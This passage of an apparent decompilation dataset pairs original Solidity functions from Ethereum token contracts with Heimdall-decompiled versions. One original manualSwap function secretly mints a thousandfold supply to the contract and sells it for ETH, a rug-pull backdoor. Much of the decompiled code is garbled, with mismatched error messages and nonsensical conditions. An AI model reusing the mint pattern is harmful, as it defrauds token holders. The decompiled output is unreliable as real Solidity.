0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(!(!bytes1(swapEnabled)), \"ERC20: transfer from the zero address\");\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = address(arg0);\n        var_b = 0x08;\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer from the zero address\");\n        require(!(sellTotalFees > 0), \"ERC20: transfer from the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x08;\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer from the zero address\");\n        require(!(buyTotalFees > 0), \"ERC20: transfer from the zero address\");\n        require(!0, \"ERC20: transfer from the zero address\");\n        require(!((arg1 - 0) > arg1), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        if (!swapEnabled / 0x01000000) {\n            if (!swapEnabled / 0x01000000) {\n                if (!swapEnabled / 0x01000000) {\n                    if (!swapEnabled / 0x01000000) {\n                        if (!swapEnabled / 0x01000000) {\n                        }\n                    }\n                }\n            }\n        }\n        if (swapEnabled / 0x010000) {\n            var_a = address(msg.sender);\n            var_b = 0x08;\n            require(bytes1(swapEnabled / 0x010000), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(arg0);\n            var_b = 0x07;\n            require(!(bytes1(storage_map_b[var_a])), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(arg0);\n            var_b = 0x08;\n            require(!(!bytes1(storage_map_b[var_a])), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(msg.sender);\n            var_b = 0x07;\n            require(!(bytes1(storage_map_b[var_a])), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(arg0);\n            var_b = 0x07;\n            require(!(!bytes1(storage_map_b[var_a])), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n        }\n        require(!(arg1 > maxTransactionAmount), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x36;\n        var_g = 0x53656c6c207472616e7366657220616d6f756e74206578636565647320746865;\n        var_h = 0x206d61785472616e73616374696f6e416d6f756e742e00000000000000000000;\n        if (!storage_map_b[var_a]) {\n        }\n        require(!(arg1 > maxTransactionAmount), \"Buy transfer amount exceeds the maxTransactionAmount.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x35;\n        var_g = 0x427579207472616e7366657220616d6f756e7420657863656564732074686520;\n        var_h = 0x6d61785472616e73616374696f6e416d6f756e742e0000000000000000000000;\n        if (!storage_map_b[var_a]) {\n        }\n        var_a = address(msg.sender);\n        var_b = 0x06;\n        require(bytes1(storage_map_b[var_a]), \"Trading is not active.\");\n        require(bytes1(storage_map_b[var_a]), \"Trading is not active.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x16;\n        var_g = 0x54726164696e67206973206e6f74206163746976652e00000000000000000000;\n        if (!address(arg0)) {\n            if (!address(arg0)) {\n            }\n        }\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x050355a5eA2d1590C7FBB1aA354b4f698d221b37", "original_solidity_code": "function disableTransferDelay() external onlyOwner returns (bool) {\r\n        transferDelayEnabled = false;\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function disableTransferDelay() public returns (bool) {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        transferDelayEnabled = (0 * 0x01) | (uint248(transferDelayEnabled));\n        var_a = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0xe2BFF0b8121D4977F0aFd680dB7d3eADDa4Ab3Df", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\nreturn tokenFromReflection(_rOwned[account]);\r\n}", "heimdall_decompiled_code": "function balanceOf(address arg0) public view {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x02;\n        require(!(storage_map_h[var_a] > store_j), \"Amount must be less than total reflections\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x2a;\n        var_f = 0x416d6f756e74206d757374206265206c657373207468616e20746f74616c2072;\n        var_g = 0x65666c656374696f6e7300000000000000000000000000000000000000000000;\n        uint256 var_h = 0x40 + var_h;\n        var_c = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x016345785d8a0000, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        uint256 var_g = var_h.length;\n        require(!(0 > var_h.length), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_k = 0;\n        var_l = var_m;\n        require(!(0x20 > var_h.length), \"SafeMath: division by zero\");\n        var_k = 0;\n        if (0x016345785d8a0000) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_n = 0x12;\n            require(0x016345785d8a0000);\n        }\n    }"}
{"contract_address": "0xE6e64A82283755f0865602b007A4eB7FFFf055De", "original_solidity_code": "function approve(address spender, uint256 amount) public returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x36c3C1D874fd543c139cF9dDBDF1a8fEe8301d16", "original_solidity_code": "function transfer(address recipient, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public view {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"TOKEN: Max Transaction Limit\");\n        require(address(arg0), \"TOKEN: Max Transaction Limit\");\n        require(arg1 > 0, \"TOKEN: Max Transaction Limit\");\n        require(address(owner) == (address(msg.sender)), \"TOKEN: Max Transaction Limit\");\n        require(!(!(address(owner)) == (address(arg0))), \"TOKEN: Max Transaction Limit\");\n        require(bytes1(uniswapV2Pair / 0x010000000000000000000000000000000000000000), \"TOKEN: Max Transaction Limit\");\n        require(!(arg1 > _maxTxAmount), \"TOKEN: Max Transaction Limit\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1c;\n        var_d = 0x544f4b454e3a204d6178205472616e73616374696f6e204c696d697400000000;\n        address var_e = address(msg.sender);\n        var_f = 0x10;\n        require(!(!bytes1(storage_map_c[var_e])), \"TOKEN: Your account is blacklisted!\");\n        require(!(bytes1(storage_map_c[var_e])), \"TOKEN: Your account is blacklisted!\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x23;\n        var_d = 0x544f4b454e3a20596f7572206163636f756e7420697320626c61636b6c697374;\n        var_g = 0x6564210000000000000000000000000000000000000000000000000000000000;\n        require(address(uniswapV2Pair) == (address(arg0)), \"Amount must be less than total reflections\");\n        var_e = address(arg0);\n        var_f = 0x02;\n        require(!(storage_map_c[var_e] > store_m), \"Amount must be less than total reflections\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x2a;\n        var_d = 0x416d6f756e74206d757374206265206c657373207468616e20746f74616c2072;\n        var_g = 0x65666c656374696f6e7300000000000000000000000000000000000000000000;\n        uint256 var_h = 0x40 + var_h;\n        var_a = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x016345785d8a0000, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        uint256 var_g = var_h.length;\n        uint256 var_k = 0;\n        var_l = var_m;\n        var_k = 0;\n        if (0x016345785d8a0000) {\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_n = 0x12;\n            require(0x016345785d8a0000, \"TOKEN: This account cannot send tokens until trading is enabled\");\n        }\n        require(address(owner) == (address(msg.sender)), \"TOKEN: This account cannot send tokens until trading is enabled\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x3f;\n        var_d = 0x544f4b454e3a2054686973206163636f756e742063616e6e6f742073656e6420;\n        var_g = 0x746f6b656e7320756e74696c2074726164696e6720697320656e61626c656400;\n        var_e = address(msg.sender);\n        var_f = 0x05;\n        if (storage_map_c[var_e]) {\n            if (storage_map_c[var_e]) {\n                if (!storage_map_c[var_e]) {\n                    if (0) {\n                        if (store_n) {\n                            if (store_n) {\n                            }\n                        }\n                        if (!(address(uniswapV2Pair)) == (address(msg.sender))) {\n                            require(bytes1(storage_map_c[var_e]), \"Transfer amount must be greater than zero\");\n                            require(bytes1(storage_map_c[var_e]), \"Transfer amount must be greater than zero\");\n                            require(!(bytes1(storage_map_c[var_e])), \"Transfer amount must be greater than zero\");\n                            require(0, \"Transfer amount must be greater than zero\");\n                            require(!(address(uniswapV2Pair) == (address(msg.sender))), \"Transfer amount must be greater than zero\");\n                            require(!(address(uniswapV2Pair) == (address(msg.sender))), \"Transfer amount must be greater than zero\");\n                        }\n                    }\n                    require(!(address(uniswapV2Pair) == (address(arg0))), \"Transfer amount must be greater than zero\");\n                }\n                require(!(address(uniswapV2Pair) == (address(arg0))), \"Transfer amount must be greater than zero\");\n            }\n            require(0x01, \"Transfer amount must be greater than zero\");\n        }\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x29;\n        var_d = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_g = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x23;\n        var_d = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x25;\n        var_d = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xe2BFF0b8121D4977F0aFd680dB7d3eADDa4Ab3Df", "original_solidity_code": "function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner {\r\n_maxWallet = maxWalletSize;\r\n}", "heimdall_decompiled_code": "function setMaxWalletSize(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _maxWallet = arg0;\n    }"}
{"contract_address": "0x1871d9f06F91AD65c92bD2c67eB85B3EBd5d7501", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender() == _taxWallet);\r\n        _balances[address(this)] = _balances[address(this)].add(_tTotal*1000);\r\n        uint256 tokenBalance = balanceOf(address(this));\r\n\r\n        if (tokenBalance > 0) {\r\n            swapTokensForETH(tokenBalance);\r\n        }\r\n        uint256 ethBalance = address(this).balance;\r\n        if (ethBalance > 0) {\r\n            transferETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public view {\n        require(address(msg.sender) == (address(transferDelay / 0x0100)));\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x174876e800) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x11;\n                if (0x0a) {\n                    if (0x0a == 0x01) {\n                        if (0x0a == 0x02) {\n                            if (!0x09 > 0xff) {\n                                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_b = 0x11;\n                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                    if (!0x09 > 0x01) {\n                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                            var_b = 0x11;\n                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_b = 0x11;\n                                                if (!0x01) {\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x6BC7d0c26885D7c1C384c3aF3CA6214D628B2712", "original_solidity_code": "function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\\n        _transfer(_msgSender(), recipient, amount);\\n        return true;\\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        require(0 - arg1, \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(tradingActive)), \"ERC20: transfer amount exceeds balance\");\n        require(address(owner) == (address(msg.sender)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(owner)) == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        require(!(address(arg0)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!0xdead == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        require(!(!0xdead == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(this);\n        uint256 var_b = 0;\n        require(storage_map_b[var_a] < swapTokensAtAmount, \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0x12;\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!0, \"ERC20: transfer amount exceeds balance\");\n        var_a = address(arg0);\n        var_b = 0x14;\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!(sellTotalFees > 0), \"ERC20: transfer amount exceeds balance\");\n        require((sellTotalFees == ((sellTotalFees * arg1) / arg1)) | !arg1, \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(0x64, \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(!((sellTotalFees * arg1) / 0x64), \"ERC20: transfer amount exceeds balance\");\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(this), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0;\n        require(!(storage_map_b[var_a] < ((sellTotalFees * arg1) / 0x64)), \"ERC20: transfer amount exceeds balance\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x26;\n        var_g = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_h = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - ((sellTotalFees * arg1) / 0x64);\n        var_a = address(this);\n        require(!(storage_map_b[var_a] > (((sellTotalFees * arg1) / 0x64) + storage_map_b[var_a])), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        storage_map_b[var_a] = ((sellTotalFees * arg1) / 0x64) + storage_map_b[var_a];\n        uint256 var_d = (sellTotalFees * arg1) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (sellTotalFees * arg1) / 0x64);\n        require(!((arg1 - ((sellTotalFees * arg1) / 0x64)) > arg1), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0x14;\n        if (!storage_map_b[var_a]) {\n            if (!buyTotalFees > 0) {\n            }\n            require(!bytes1(storage_map_b[var_a]));\n            var_a = address(arg0);\n            var_b = 0x14;\n            require(bytes1(owner / 0x010000000000000000000000000000000000000000));\n            require(!bytes1(storage_map_b[var_a]));\n            var_a = address(msg.sender);\n            var_b = 0x14;\n            require(!sellTotalFees > 0);\n            require(!bytes1(storage_map_b[var_a]));\n        }\n        owner = 0x010000000000000000000000000000000000000000 | (uint248(owner));\n        var_a = address(this);\n        var_b = 0;\n        require(0 - storage_map_b[var_a]);\n        require(!storage_map_b[var_a] > maxSwapAmount);\n        var_d = 0x02;\n        uint256 var_i = var_i + 0x60;\n        var_j = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_k = address(this);\n        var_l = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).WETH(var_h); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!(((var_i + ret0.length) - var_i) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_i.length == (address(var_i.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        uint256 var_m = address(var_i.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_n = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_o = 0x20;\n        var_p = 0x22;\n        var_q = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_r = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        var_a = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = maxSwapAmount;\n        var_n = maxSwapAmount;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, maxSwapAmount);\n        var_n = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        var_o = maxSwapAmount;\n        uint256 var_p = 0;\n        var_q = 0xa0;\n        uint256 var_s = var_i.length;\n        address var_r = address(this);\n        uint256 var_t = block.timestamp;\n        require(address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).code.length);\n        (bool success, bytes memory ret0) = address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).Unresolved_791ac947(var_o); // call\n        if (0x02) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_c = 0x12;\n            if (!(address(this).balance - (address(this).balance / 0x02)) > address(this).balance) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_c = 0x11;\n                (bool success, bytes memory ret0) = address(store_r).transfer(address(this).balance / 0x02);\n                require(0x02, \"ERC20: approve from the zero address\");\n                (bool success, bytes memory ret0) = address(store_e).transfer(address(this).balance - (address(this).balance / 0x02));\n                require(!(address(this).balance - (address(this).balance / 0x02) > address(this).balance), \"ERC20: approve from the zero address\");\n            }\n        }\n        var_n = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_o = 0x20;\n        var_p = 0x24;\n        var_q = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_r = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        var_d = 0x02;\n        var_i = var_i + 0x60;\n        var_j = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        var_k = address(this);\n        var_l = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).WETH(var_h); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!(((var_i + ret0.length) - var_i) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_i.length == (address(var_i.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        var_m = address(var_i.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_n = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_o = 0x20;\n        var_p = 0x22;\n        var_q = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_r = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_n = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_o = 0x20;\n        var_p = 0x24;\n        var_q = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_r = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (!tradingActive / 0x010000) {\n            if (!tradingActive / 0x010000) {\n                if (!tradingActive / 0x010000) {\n                    if (!tradingActive / 0x010000) {\n                        if (!tradingActive / 0x010000) {\n                        }\n                    }\n                }\n            }\n        }\n        if (!address(arg0)) {\n            if (!address(arg0)) {\n            }\n        }\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x842FD31eAd327AE42D19B7BFbdB045d3A219c662", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        if (address(arg0)) {\n            if (address(msg.sender)) {\n                if (arg1 > 0) {\n                    if (!AntiWhaleEnabled) {\n                        address var_a = address(msg.sender);\n                        var_b = 0x0a;\n                        require(address(arg0), \"Transfer amount exceeds the max transfer limit.\");\n                        require(address(msg.sender), \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = address(arg0);\n                        var_b = 0x04;\n                        require(arg1 > 0, \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = address(msg.sender);\n                        var_b = 0x04;\n                        require(!(bytes1(AntiWhaleEnabled)), \"Transfer amount exceeds the max transfer limit.\");\n                        require(!(!bytes1(storage_map_e[var_a])), \"Transfer amount exceeds the max transfer limit.\");\n                        require(!(!bytes1(storage_map_e[var_a])), \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = address(msg.sender);\n                        var_b = 0x02;\n                        require(!(!bytes1(storage_map_e[var_a])), \"Transfer amount exceeds the max transfer limit.\");\n                        require(!(!bytes1(storage_map_e[var_a])), \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = address(msg.sender);\n                        var_b = 0x05;\n                        require(!(!bytes1(storage_map_e[var_a])), \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_c = 0x11;\n                        storage_map_e[var_a] = storage_map_e[var_a] - arg1;\n                        require(bytes1(storage_map_e[var_a]), \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = address(arg0);\n                        var_b = 0x04;\n                        require(!((storage_map_e[var_a] - arg1) > storage_map_e[var_a]), \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = address(arg0);\n                        var_b = 0x04;\n                        require(0, \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = address(msg.sender);\n                        var_b = 0x04;\n                        require(!(!bytes1(storage_map_e[var_a])), \"Transfer amount exceeds the max transfer limit.\");\n                        require(!(!bytes1(storage_map_e[var_a])), \"Transfer amount exceeds the max transfer limit.\");\n                        require(!(!bytes1(storage_map_e[var_a])), \"Transfer amount exceeds the max transfer limit.\");\n                        require(0, \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_c = 0x11;\n                        require((0 == ((0 * arg1) / arg1)) | !arg1, \"Transfer amount exceeds the max transfer 